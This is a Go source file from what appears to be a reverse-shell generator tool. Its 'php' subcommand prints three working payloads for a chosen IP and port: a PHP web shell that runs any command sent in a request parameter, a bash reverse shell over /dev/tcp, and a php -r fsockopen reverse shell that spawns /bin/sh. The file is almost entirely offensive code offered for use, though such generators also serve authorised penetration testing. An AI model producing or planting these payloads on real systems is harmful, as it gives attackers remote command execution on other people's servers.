package cmd

import (
	"fmt"

	"github.com/secopsbear/sb-shells/colors"
	"github.com/spf13/cobra"
)

// phpCmd represents the php command
var phpCmd = &cobra.Command{
	Use:   "php",
	Short: "Generate php reverse shell",
	Long:  `Generate php reverse shell.`,
	Run: func(cmd *cobra.Command, args []string) {

		validateIpAndPorts(cmd, args)
		// checkCmdCheck(cmd, args)

		fmt.Println(colors.CyanColor("Generated PHP reverse shell script: "))

		phpScript := ""

		fmt.Println(colors.CyanColor("Basic shell_exec: "))
		phpScript = `<?php echo "<pre>" . shell_exec($_REQUEST['bear']) . "</pre>"; ?>`
		fmt.Println(phpScript)

		fmt.Println(colors.CyanColor("Shell exec 1:"))
		phpScript = `<?php exec('/bin/bash -c "bash -i >& /dev/tcp/` + ipAddressLocal + `/` + portLocal + ` 0>&1"'); ?>`
		fmt.Println(phpScript)

		fmt.Println(colors.CyanColor("Shell exec 2:"))
		phpScript = `php -r '$sock=fsockopen("` + ipAddressLocal + `",` + portLocal + `);exec("/bin/sh -i <&3 >&3 2>&3");'`
		fmt.Println(phpScript)

	},
}

func init() {
	rootCmd.AddCommand(phpCmd)
}
